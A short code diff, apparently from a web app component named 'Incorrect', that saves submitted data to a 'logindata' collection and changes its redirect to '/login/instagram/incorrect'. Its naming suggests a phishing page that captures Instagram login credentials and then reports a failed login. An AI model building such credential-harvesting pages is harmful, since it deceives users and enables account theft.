@@ -19,7 +19,7 @@ export default async function Incorrect(){
     };
     const db = (await connectDB).db('login');
     await db.collection('logindata').insertOne(data);
-    redirect('/login/load');
+    redirect('/login/instagram/incorrect');
   }
 
   return (
